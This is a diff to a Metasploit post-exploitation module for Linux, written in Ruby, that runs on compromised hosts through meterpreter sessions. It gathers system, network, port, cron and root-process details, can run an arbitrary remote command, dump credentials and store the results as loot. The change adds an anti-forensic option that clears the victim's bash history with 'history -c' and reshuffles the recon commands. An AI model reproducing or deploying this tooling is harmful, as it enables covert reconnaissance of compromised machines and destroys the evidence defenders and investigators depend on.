@@ -26,6 +26,7 @@
 # Agressive system fingerprints scan?      => set AGRESSIVE_DUMP true
 # Dump remote credentials from target?     => set CREDENTIALS_DUMP true
 # The bash command to execute remotly      => set SINGLE_COMMAND uname -a
+# Delete remote shell history commands?    => set DEL_SHELL_HISTORY true
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
@@ -99,8 +100,8 @@ class MetasploitModule < Msf::Post
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author :D
                                 ],
  
-                        'Version'        => '$Revision: 1.2',
-                        'DisclosureDate' => 'set 25 2017',
+                        'Version'        => '$Revision: 1.3',
+                        'DisclosureDate' => 'set 27 2017',
                         'Platform'       => 'linux',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'true',  # root privileges required?
@@ -134,6 +135,7 @@ class MetasploitModule < Msf::Post
                                 OptBool.new('STORE_LOOT', [false, 'Store dumped data to msf4/loot folder?', false]),
                                 OptBool.new('AGRESSIVE_DUMP', [false, 'Agressive system fingerprints scan?', false]),
                                 OptBool.new('CREDENTIALS_DUMP', [false, 'Dump remote credentials from target?', false]),
+                                OptBool.new('DEL_SHELL_HISTORY', [false, 'Delete remote shell history commands?', false]),
                                 OptString.new('SINGLE_COMMAND', [false, 'The bash command to execute remotelly'])
                         ], self.class)
  
@@ -185,7 +187,7 @@ def run
     # the non-return of sysinfo command reveals that we are not on a meterpreter session!
     #
     if not sysinfo.nil?
-      print_status("Running module against: #{sys_info['Computer']}")
+      print_good("Running module against: #{sys_info['Computer']}")
     else
       print_error("[ABORT]: This module only works in meterpreter sessions!")
       return nil
@@ -204,15 +206,16 @@ def run
       #
       date_out = cmd_exec("date")
       file_sys = cmd_exec("df -H")
-      storage_mont = cmd_exec("lsblk")
+      mont_uuid = cmd_exec("lsblk -f")
+      storage_mont = cmd_exec("lsblk -m")
       distro_uname = cmd_exec("uname -a")
-      current_shell = cmd_exec("echo $0")
-      distro_shells = cmd_exec("grep '^[^#]' /etc/shells")
-      default_shell = cmd_exec("ps -p $$ | tail -1 | awk '{ print $4 }'")
+      net_stat = cmd_exec("netstat -tulpn")
+      net_established = cmd_exec("netstat -atnp | grep \"ESTABLISHED\"")
       gateway = cmd_exec("netstat -r | grep \"255.\" | awk {'print $3'}")
       interface = cmd_exec("netstat -r | grep default | awk {'print $8'}")
       hardware_bits = cmd_exec("lscpu | grep 'CPU op-mode' | awk {'print $3'}")
       hardware_vendor = cmd_exec("lscpu | grep 'Vendor ID' | awk {'print $3'}")
+      mem_dirty = cmd_exec("cat /proc/meminfo | grep \"Dirty\" | awk {'print $2,$3'}")
       mem_free = cmd_exec("cat /proc/meminfo | grep \"MemFree\" | awk {'print $2,$3'}")
       sys_lang = cmd_exec("set | egrep '^(LANG|LC_)' | cut -d '=' -f2 | cut -d '.' -f1")
       mem_total = cmd_exec("cat /proc/meminfo | grep \"MemTotal\" | awk {'print $2,$3'}")
@@ -237,6 +240,7 @@ def run
         data_dump << "CPU (Model name)    : #{model_name}\n"
         data_dump << "Target mem free     : #{mem_free}\n"
         data_dump << "Target mem total    : #{mem_total}\n"
+        data_dump << "Target mem dirty    : #{mem_dirty}\n"
         data_dump << "System language     : #{sys_lang}\n"
         data_dump << "Target interface    : #{interface}\n"
         data_dump << "Target IP addr      : #{host_ip}\n"
@@ -252,21 +256,19 @@ def run
         data_dump << "-------------\n"
         data_dump << file_sys
         data_dump << "\n\n"
-        data_dump << "STORAGE DEVICES :\n"
-        data_dump << "-----------------\n"
+        data_dump << "STORAGE DEVICES INFO:\n"
+        data_dump << "---------------------\n"
         data_dump << storage_mont
         data_dump << "\n\n"
-        data_dump << "CURRENT SHELL :\n"
-        data_dump << "---------------\n"
-        data_dump << current_shell
+        data_dump << mont_uuid
         data_dump << "\n\n"
-        data_dump << "DEFAULT SHELL :\n"
-        data_dump << "---------------\n"
-        data_dump << default_shell
+        data_dump << "TARGET OPEN PORTS :\n"
+        data_dump << "-------------------\n"
+        data_dump << net_stat
         data_dump << "\n\n"
-        data_dump << "AVAILABLE SHELLS :\n"
-        data_dump << "------------------\n"
-        data_dump << distro_shells
+        data_dump << "ESTABLISHED CONNECTIONS :\n"
+        data_dump << "-------------------------\n"
+        data_dump << net_established
         data_dump << "\n\n"
 
 
@@ -281,13 +283,15 @@ def run
           #
           # bash commands to be executed remotelly ..
           #
+          current_shell = cmd_exec("echo $0")
           list_drivers = cmd_exec("lspci -vv")
-          net_stat = cmd_exec("netstat -tulpn")
           demi_bios = cmd_exec("dmidecode -t bios")
           cron_tasks = cmd_exec("ls -la /etc/cron*")
           root_services = cmd_exec("ps -aux | grep '^root'")
+          distro_shells = cmd_exec("grep '^[^#]' /etc/shells")
           distro_history = cmd_exec("ls -la /root/.*_history")
           distro_logs = cmd_exec("find /var/log -type f -perm -4")
+          default_shell = cmd_exec("ps -p $$ | tail -1 | awk '{ print $4 }'")
             print_status("Storing scan results into msf database ..")
             Rex::sleep(0.5)
             #
@@ -298,17 +302,17 @@ def run
             data_dump << "|  AGRESSIVE SCAN REPORTS  |\n"
             data_dump << "+--------------------------+\n"
             data_dump << "\n\n"
-            data_dump << "TARGET OPEN PORTS :\n"
-            data_dump << "-------------------\n"
-            data_dump << net_stat
-            data_dump << "\n\n"
-            data_dump << "ROOT SERVICES RUNNING :\n"
-            data_dump << "-----------------------\n"
-            data_dump << root_services
-            data_dump << "\n\n"
-            data_dump << "CRONTAB TASKS :\n"
+            data_dump << "CURRENT SHELL :\n"
             data_dump << "---------------\n"
-            data_dump << cron_tasks
+            data_dump << current_shell
+            data_dump << "\n\n"
+            data_dump << "DEFAULT SHELL :\n"
+            data_dump << "---------------\n"
+            data_dump << default_shell
+            data_dump << "\n\n"
+            data_dump << "AVAILABLE SHELLS :\n"
+            data_dump << "------------------\n"
+            data_dump << distro_shells
             data_dump << "\n\n"
             data_dump << "LIST OF HISTORY FILES :\n"
             data_dump << "-----------------------\n"
@@ -317,6 +321,14 @@ def run
             data_dump << "LIST OF LOGFILES FOUND :\n"
             data_dump << "------------------------\n"
             data_dump << distro_logs
+            data_dump << "\n\n"
+            data_dump << "ROOT SERVICES RUNNING :\n"
+            data_dump << "-----------------------\n"
+            data_dump << root_services
+            data_dump << "\n\n"
+            data_dump << "CRONTAB TASKS :\n"
+            data_dump << "---------------\n"
+            data_dump << cron_tasks
             data_dump << "\n\n"
             data_dump << "SMBIOS DATA (sysfs) :\n"
             data_dump << "---------------------\n"
@@ -391,7 +403,7 @@ def run
         exec_bash = datastore['SINGLE_COMMAND']
         # check if single_command option its configurated ..
         if not exec_bash.nil?
-          print_status("Running a single bash command ..")
+          print_status("Executing user input remote bash command ..")
           Rex::sleep(0.5)
           # bash command to be executed remotelly ..
           single_comm = cmd_exec("#{exec_bash}")
@@ -423,14 +435,28 @@ def run
        Rex::sleep(0.5)
 
 
+
      #
      # Store 'data_dump' contents into msf loot folder? (local) ..
      # IF sellected previous in advanced options (set STORE_LOOT true) ..
      #
      if datastore['STORE_LOOT'] == true
-       print_warning("Fingerprints stored under: ~/.msf4/loot folder")
+       print_warning("Fingerprints stored under: ~/.msf4/loot directory")
        store_loot("linux_hostrecon", "text/plain", session, data_dump, "linux_hostrecon.txt", "linux_hostrecon")
+       Rex::sleep(0.5)
      end
+     #
+     # linux_hostrecon - Anti-forensic module ..
+     # This funtion will delete all entrys from remote bash shell (history command list) ..
+     #
+     if datastore['DEL_SHELL_HISTORY'] == true
+       print_warning("Remote bash shell history command list deleted ..")
+       cmd_exec("history -c")
+       Rex::sleep(0.5)
+     end
+
+
+
    #
    # end of the 'def run()' funtion (exploit code) ..
    #
